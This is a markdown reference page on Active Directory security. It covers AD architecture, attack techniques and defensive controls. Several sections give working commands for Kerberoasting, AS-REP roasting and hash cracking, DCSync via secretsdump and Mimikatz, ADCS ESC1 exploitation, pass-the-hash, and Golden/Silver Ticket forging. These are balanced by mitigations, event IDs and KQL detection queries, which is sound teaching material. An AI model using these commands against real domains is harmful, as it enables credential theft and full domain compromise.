# Active Directory Security

> Active Directory is the backbone of enterprise identity — controlling authentication, authorization, and access for millions of organizations worldwide. Attackers target AD for persistence and privilege escalation; a compromised domain controller is effectively a full organizational compromise. Defenders must understand both the attack and defense sides of AD to protect their environments effectively.

---

## AD Architecture Review

### Logical Structure

| Component | Description |
|---|---|
| **Forest** | Top-level security boundary; one or more domains sharing a schema and global catalog |
| **Domain** | Administrative boundary within a forest; contains users, computers, groups, and policies |
| **Domain Controller (DC)** | Hosts AD DS; handles Kerberos/NTLM authentication, LDAP queries, replication, policy enforcement |
| **NTDS.dit** | The AD database on every DC — stores all domain objects including hashed credentials; primary attack target |
| **Global Catalog (GC)** | Partial replica of all objects in the forest; required for cross-domain logon and universal group resolution |
| **FSMO Roles** | Five single-master operation roles: Schema Master, Domain Naming Master, PDC Emulator, RID Master, Infrastructure Master |
| **SYSVOL** | Shared folder on every DC; stores GPO files and logon scripts; replicated via DFSR |
| **Trust** | Relationship allowing cross-domain/forest authentication; types: parent-child (transitive), forest trust, external trust, shortcut trust — each has different security implications |
| **Organizational Unit (OU)** | Container for grouping objects; primary target for GPO application and delegation of control |
| **Group Policy Object (GPO)** | Policy container linked to sites, domains, or OUs; enforces security settings and software deployment |

### Key Services and Ports

| Protocol | Port | Use |
|---|---|---|
| Kerberos | 88 (TCP/UDP) | Authentication ticket exchange — the primary AD auth protocol |
| LDAP | 389 (TCP/UDP) | Directory queries and modifications (cleartext) |
| LDAPS | 636 (TCP) | LDAP over TLS |
| DNS | 53 (TCP/UDP) | Name resolution; SRV records for DC/GC discovery |
| SMB | 445 (TCP) | File shares, SYSVOL/NETLOGON access, RPC transport, lateral movement vector |
| RPC / EPM | 135 (TCP) | RPC endpoint mapper; used for replication, management, and remote administration |
| Global Catalog | 3268 / 3269 (TCP) | GC LDAP / GC LDAPS |
| WinRM | 5985 / 5986 (TCP) | Remote PowerShell management |

### Authentication Protocols

#### Kerberos TGT/TGS Flow
1. **AS-REQ**: Client requests a Ticket Granting Ticket (TGT) from the KDC; includes pre-authentication (timestamp encrypted with user's NT hash)
2. **AS-REP**: KDC issues TGT encrypted with the `krbtgt` account hash
3. **TGS-REQ**: Client presents TGT and requests a Service Ticket for a target SPN
4. **TGS-REP**: KDC issues service ticket encrypted with the target service account's NT hash
5. **AP-REQ**: Client presents service ticket to the target service

#### NTLM Challenge-Response
1. Client sends username to server
2. Server responds with a 16-byte random challenge
3. Client computes NTLM response using the NT hash of the user password
4. Server forwards credentials to DC for verification (or verifies locally for local accounts)
5. Vulnerable to: Pass-the-Hash, NTLM relay, and offline cracking

---

## Initial Foothold Techniques

| Technique | Description | Tools |
|---|---|---|
| **Password Spraying** | Try one password against all accounts — stays below lockout threshold | [Kerbrute](https://github.com/ropnop/kerbrute), [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray), [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) |
| **LLMNR/NBT-NS Poisoning** | Responder responds to broadcast name resolution requests, captures NTLMv2 hashes for offline cracking | [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh) |
| **AS-REP Roasting (no creds)** | Accounts with "do not require Kerberos pre-authentication" return crackable encrypted TGT segment | [Rubeus](https://github.com/GhostPack/Rubeus), [impacket-GetNPUsers](https://github.com/fortra/impacket) |
| **LDAP Anonymous Bind** | Enumerate users, groups, and computers on misconfigured DCs without credentials | `ldapsearch`, [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) |
| **SMB Null Session** | Enumerate shares and user lists on legacy systems without credentials | [enum4linux](https://github.com/CiscoCXSecurity/enum4linux), `rpcclient -U "" -N` |

---

## Post-Compromise Enumeration

```powershell
# PowerView — key AD enumeration commands
Get-NetDomain                                  # Domain info, PDC, DC list
Get-NetDomainController                        # All domain controllers
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE      # Active user accounts
Get-NetGroup "Domain Admins" -Recurse          # Recursive group membership
Get-NetComputer -OperatingSystem "*Server*"    # Server list
Find-LocalAdminAccess                          # Where does current user have local admin?
Get-DomainUser -SPN                            # Find Kerberoastable accounts
Get-DomainUser -PreauthNotRequired             # Find AS-REP Roastable accounts
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs  # ACL on DA group

# BloodHound collection
.\SharpHound.exe -c All --zipfilename bloodhound.zip
# Or from Linux (with credentials):
bloodhound-python -u user -p pass -d domain.local -dc dc.domain.local -c All
```

---

## Kerberoasting

Request service tickets for any SPN-registered account; the ticket is encrypted with the service account's NT hash and can be cracked offline. Any domain user can perform this — no special privileges required.

```bash
# Get all SPNs and request service tickets (from Linux)
impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.10.10.10 -request -outputfile kerberoast.txt

# From Windows (Rubeus)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt /format:hashcat

# Crack with Hashcat
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force

# Mitigation: use AES-only accounts (prevents RC4 downgrade)
# Detection: Event 4769 with Ticket Encryption Type 0x17 (RC4) from non-DC source
```

---

## AS-REP Roasting

Accounts with "Do not require Kerberos preauthentication" enabled return an AS-REP that contains data encrypted with the user's NT hash — crackable without ever authenticating.

```bash
# Find vulnerable accounts (requires credentials)
impacket-GetNPUsers domain.local/user:pass -dc-ip 10.10.10.10 -request -outputfile asrep.txt

# Without credentials (user list required)
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip 10.10.10.10

# Crack with Hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Mitigation: enable preauthentication on all accounts
# Audit: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
```

---

## ACL Abuse

BloodHound reveals ACL relationships that attackers can exploit to escalate privileges without touching noisy techniques like Kerberoasting. This is the most overlooked attack path in AD environments.

| ACL Right | What It Allows | Example Attack |
|---|---|---|
| **GenericAll** | Full control over object | Add yourself to privileged group, reset password, write SPN for Kerberoasting, configure RBCD |
| **GenericWrite** | Write any non-protected attribute | Add SPN for Kerberoasting, write logon script, set `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| **WriteOwner** | Change object ownership | Take ownership, then grant yourself GenericAll |
| **WriteDACL** | Modify ACL of object | Grant yourself GenericAll or DCSync rights |
| **ForceChangePassword** | Reset password without knowing current | Reset password of any privileged account |
| **AddMember** | Add members to group | Add yourself to Domain Admins or other privileged groups |
| **AllExtendedRights** | All extended rights including DS-Replication | DCSync from any machine with this right on the domain object |
| **Self-Membership** | Add self to group | Add your own account to a privileged group |

```powershell
# Identify ACL misconfigurations with PowerView
Get-ObjectAcl -SamAccountName "target_user" -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDACL|WriteOwner"
}

# Abuse GenericAll on a user: add SPN for Kerberoasting
Set-DomainObject -Identity target_user -Set @{serviceprincipalname='fake/spn'} -Verbose

# Abuse WriteDACL on domain object: grant DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

---

## Active Directory Certificate Services (ADCS) Attacks

ADCS misconfigurations are among the most impactful modern AD attack vectors — they allow privilege escalation to Domain Admin and persistent backdoor access via certificate-based authentication.

| ESC | Vulnerability | Impact |
|---|---|---|
| **ESC1** | Certificate template allows Subject Alternative Name (SAN) | Request cert for any user including DA; authenticate as DA |
| **ESC2** | Certificate usable for any purpose including authentication | Request cert for any user |
| **ESC4** | Write permission on certificate template | Modify template to allow ESC1, then exploit |
| **ESC6** | `EDITF_ATTRIBUTESUBJECTALTNAME2` flag on CA | Any template allows SAN; authenticate as any user |
| **ESC8** | AD CS web enrollment over HTTP | NTLM relay to obtain certificate as DC machine account → Golden Ticket equivalent |

```bash
# Find vulnerable templates with Certipy
certipy find -u user@domain.local -p pass -dc-ip 10.10.10.10 -stdout

# ESC1 exploitation — request cert as Domain Admin
certipy req -u user@domain.local -p pass \
  -dc-ip 10.10.10.10 \
  -target ca.domain.local \
  -ca DOMAIN-CA \
  -template VulnTemplate \
  -upn administrator@domain.local

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

---

## DCSync Attack

Replicate all password hashes from a DC using the MS-DRSR replication protocol. Requires Replication rights (Domain Admins, Domain Controllers, or accounts with AllExtendedRights on the domain object).

```bash
# From Linux with impacket
impacket-secretsdump domain.local/user:pass@dc-ip -just-dc-ntlm

# From Windows with Mimikatz
lsadump::dcsync /domain:domain.local /all /csv
lsadump::dcsync /domain:domain.local /user:krbtgt   # Get krbtgt hash for Golden Ticket

# Detection: Event 4662 with DS-Replication-Get-Changes-All GUID (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
# from a non-DC account is high-fidelity DCSync alert
```

---

## Pass-the-Hash / Pass-the-Ticket

```bash
# Pass-the-Hash with CrackMapExec (SMB)
crackmapexec smb 10.10.10.0/24 -u administrator -H <NT_hash>

# Pass-the-Hash with Impacket
impacket-psexec domain.local/administrator@10.10.10.10 -hashes :<NT_hash>

# Pass-the-Ticket with Rubeus (inject Kerberos ticket)
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Dump all tickets from memory
.\Rubeus.exe dump /nowrap
```

---

## Golden / Silver Ticket

```bash
# Golden Ticket (requires krbtgt hash and domain SID)
# Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXX /krbtgt:<hash> /ptt

# Silver Ticket (requires service account hash — no KDC contact needed)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXX \
  /target:sqlserver.domain.local /service:mssql /rc4:<service_hash> /ptt
```

---

## Delegation Abuse

| Delegation Type | Risk | Attack Path |
|---|---|---|
| **Unconstrained Delegation** | Highest — stores all TGTs that authenticate to the service | Compromise host, coerce DC auth (PrinterBug/PetitPotam), capture DC TGT, DCSync |
| **Constrained Delegation** | High — can impersonate any user to specific services | S4U2Self + S4U2Proxy to get service ticket as any user including DA |
| **Resource-Based Constrained Delegation (RBCD)** | High — requires only write access to target object | Write `msDS-AllowedToActOnBehalfOfOtherIdentity`, create machine account, S4U2 for impersonation |

---

## Enumeration Tools

| Tool | Type | Primary Use |
|---|---|---|
| [BloodHound CE](https://github.com/SpecterOps/BloodHound) + [SharpHound](https://github.com/BloodHoundAD/SharpHound) | Graph analysis | Visualize attack paths, find shortest path to Domain Admin |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) | PowerShell module | Enumerate users, groups, ACLs, GPOs, trusts, shares |
| [Certipy](https://github.com/ly4k/Certipy) | Python | ADCS enumeration and exploitation (ESC1–ESC13) |
| [ADExplorer](https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer) | GUI browser | Browse and snapshot AD objects interactively |
| [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) | LDAP dump | Dump users, groups, computers to readable HTML/JSON |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) | Multi-protocol | SMB/LDAP/WinRM Swiss army knife; spray, exec, dump |
| [Impacket](https://github.com/fortra/impacket) | Python suite | Low-level Kerberos, LDAP, SMB, RPC interaction |
| [kerbrute](https://github.com/ropnop/kerbrute) | Kerberos | User enumeration and password spraying via Kerberos |
| [PingCastle](https://www.pingcastle.com/) | Risk assessment | AD health and security risk scoring |
| [WADComs](https://wadcoms.github.io/) | Interactive cheatsheet | Interactive AD attack cheatsheet — filter by technique and tool |

---

## Defensive Controls

| Control | Implementation | Techniques Mitigated |
|---|---|---|
| **Microsoft Defender for Identity (MDI)** | Deploy sensors on all DCs; connect to Azure portal | Detects Kerberoasting, PtH, DCSync, BloodHound scanning in real-time |
| **Protected Users Security Group** | Add privileged accounts to the group | Members cannot use NTLM auth, cannot cache credentials, cannot use DES/RC4 Kerberos — kills PtH and Kerberoasting |
| **Privileged Access Workstations (PAW)** | Dedicated hardened workstations for admin tasks; no internet access | Reduces phishing and credential theft from admin workstations |
| **LAPS** | [Local Admin Password Solution](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview) — randomizes local admin passwords per machine | Eliminates lateral movement via reused local admin credentials |
| **Tiered Administration (Tier 0/1/2)** | Tier 0: DCs only; Tier 1: servers; Tier 2: workstations; no cross-tier admin logon | Limits lateral movement scope; compromise of Tier 2 cannot reach Tier 0 |
| **Credential Guard** | Enable via VBS in Windows Security settings | Protects LSASS credentials using virtualization-based security; prevents NTLM hash extraction |
| **AD Recycle Bin** | Enable via Active Directory Administrative Center | Enables recovery from accidental or malicious deletion of AD objects |
| **SMB Signing Enforcement** | GPO: `Microsoft network server: Digitally sign communications (always)` | Blocks NTLM relay over SMB |
| **Disable LLMNR / NBT-NS** | GPO: Turn off multicast name resolution; disable NetBIOS over TCP/IP | Removes Responder poisoning targets |
| **ADCS Hardening** | Patch ESC1–ESC8 misconfigurations; disable SAN-based enrollment where not required | Prevents certificate-based privilege escalation |
| **Disable Print Spooler on DCs** | `Stop-Service Spooler; Set-Service Spooler -StartupType Disabled` on all DCs | Eliminates PrinterBug coercion vector |
| **Audit Policy Hardening** | Enable advanced audit subcategories via `auditpol` | Required for detection coverage via event log monitoring |

---

## Detection Strategies

### Critical Windows Event IDs

| Event ID | Source | Meaning |
|---|---|---|
| **4768** | Security | Kerberos TGT requested — check for pre-auth disabled; unusual encryption type |
| **4769** | Security | Kerberos service ticket requested — **RC4 (0x17) encryption type from non-DC = Kerberoasting indicator** |
| **4771** | Security | Kerberos pre-auth failed — brute force or enumeration |
| **4624** | Security | Logon success — Type 3 (NTLM) from unusual sources = PtH indicator |
| **4625** | Security | Logon failure — brute force, spray |
| **4662** | Security | AD object access — **DS-Replication-Get-Changes-All GUID from non-DC = DCSync alert** |
| **4728 / 4732** | Security | Member added to global/local security group — privilege escalation monitoring |
| **4738** | Security | User account changed — monitor for `userAccountControl` changes disabling pre-auth |
| **4776** | Security | NTLM credential validation attempt — detect spray and PtH patterns |
| **5136** | Security | AD object modified — ACL changes, delegation changes, SPN additions |
| **7045** | System | New service installed — lateral movement persistence |

### Kerberoasting Detection (KQL)

```kql
SecurityEvent
| where EventID == 4769 and TicketEncryptionType == "0x17"
| where ServiceName !endswith "$"
| summarize count() by Account, IpAddress, bin(TimeGenerated, 1h)
| where count_ > 5
```

### DCSync Detection (KQL)

```kql
SecurityEvent
| where EventID == 4662
| where Properties has "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
| where SubjectUserName !in ("MSOL_*", "AAD_*")
| where SubjectUserName !endswith "$"
```

---

## NIST 800-53 Alignment

| Control | Family | AD Security Relevance |
|---|---|---|
| AC-2 | Account Management | User account lifecycle; privileged account controls; service account management |
| AC-3 | Access Enforcement | Group-based access control; OU delegation; role-based AD group design |
| AC-5 | Separation of Duties | Tiered administration model; no dual-use admin/user accounts |
| AC-6 | Least Privilege | Limiting AD rights to minimum required; removing stale privileged accounts |
| IA-2 | Identification and Authentication | Kerberos/NTLM authentication hardening; MFA for privileged access |
| IA-5 | Authenticator Management | Password policy; LAPS for local accounts; service account credential rotation |
| AU-2 | Event Logging | Windows Security event log coverage for AD authentication events |
| AU-6 | Audit Review | SIEM detection rules for Kerberoasting, DCSync, PtH, lateral movement |
| CM-6 | Configuration Settings | GPO hardening; SMB signing; disabling legacy auth; Protected Users group |
| SC-28 | Protection of Information at Rest | Credential Guard protecting LSASS; NTDS.dit encryption; BitLocker on DCs |

---

## ATT&CK Coverage

| Technique | ID | AD Attack Connection |
|---|---|---|
| Kerberoasting | T1558.003 | Request TGS for SPN accounts, crack RC4-encrypted tickets offline |
| AS-REP Roasting | T1558.004 | Request AS-REP for accounts with pre-auth disabled; crack offline |
| NTDS Credential Dump | T1003.003 | DCSync or NTDS.dit extraction to dump all domain hashes |
| Domain Policy Modification | T1484 | Modify GPOs or domain trusts to weaken security controls |
| Rogue Domain Controller | T1207 | Create a rogue DC to intercept replication and authentication |
| Steal or Forge Authentication Certificates | T1649 | ADCS ESC attacks to obtain certificates for arbitrary user impersonation |
| Pass-the-Hash | T1550.002 | Authenticate using NT hash without knowing plaintext password |
| SMB/Windows Admin Shares (Lateral Movement) | T1021.002 | Lateral movement using authenticated SMB connections |
| Golden Ticket | T1558.001 | Forge TGT using krbtgt hash for persistent domain-wide access |
| Silver Ticket | T1558.002 | Forge service ticket using service account hash; no KDC contact |
| Password Spraying | T1110.003 | Low-and-slow credential attack against all accounts |
| LLMNR/NBT-NS Poisoning | T1557.001 | Capture NTLM hashes by responding to broadcast name resolution |

---

## Certifications

| Certification | Provider | Focus |
|---|---|---|
| **CRTE** (Certified Red Team Expert) | Altered Security | Advanced AD attack chains, multi-forest, Azure AD hybrid attacks |
| **CRTP** (Certified Red Team Professional) | Altered Security | AD exploitation fundamentals, lateral movement, privilege escalation |
| **CRTO** (Certified Red Team Operator) | Zero-Point Security | AD red team ops using Cobalt Strike |
| **PNPT** (Practical Network Penetration Tester) | TCM Security | Practical AD exploitation assessment including full attack chain |
| **OSCP** | OffSec | General penetration testing with significant AD machine coverage |
| **eCPPT** | eLearnSecurity | Network penetration testing with AD exploitation |

---

## Learning Resources

| Resource | Type | Notes |
|---|---|---|
| [The Hacker Recipes — AD](https://www.thehacker.recipes/ad/) | Reference | Comprehensive AD attack technique walkthroughs with commands; best free reference |
| [SpecterOps BloodHound Documentation](https://bloodhound.readthedocs.io/) | Reference | BloodHound attack path methodology and edge type explanations |
| [harmj0y Blog](https://blog.harmj0y.net/) | Blog | Foundational Kerberos, delegation, and PowerView research |
| [adsecurity.org (Sean Metcalf)](https://adsecurity.org/) | Blog | Comprehensive AD security resource; Golden Ticket, Silver Ticket, DCSync |
| [dirkjanm Blog](https://dirkjanm.io/) | Blog | NTLM relay, Kerberos, ADCS (ESC attacks) original research |
| [WADComs](https://wadcoms.github.io/) | Interactive cheatsheet | Filter by attack/tool; immediate command reference for every AD technique |
| [Microsoft Defender for Identity Docs](https://learn.microsoft.com/en-us/defender-for-identity/) | Reference | MDI sensor deployment and alert tuning for AD attack detection |
| [TCM Security — Practical Ethical Hacking](https://academy.tcm-sec.com/) | Course | Practical AD enumeration and exploitation course; great for PNPT prep |

---

## Related Disciplines

- [identity-access-management.md](identity-access-management.md) — IAM architecture, PAM, MFA, Credential Guard
- [red-teaming.md](red-teaming.md) — adversary simulation, C2 frameworks, full AD exploitation chains
- [penetration-testing.md](penetration-testing.md) — scoped AD assessments, methodology, reporting
- [kerberos-attacks.md](kerberos-attacks.md) — deep dive into Kerberos protocol attacks: delegation, ticket forging, roasting
- [cloud-security.md](cloud-security.md) — Azure AD / Entra ID hybrid attack paths extending from on-prem AD compromise
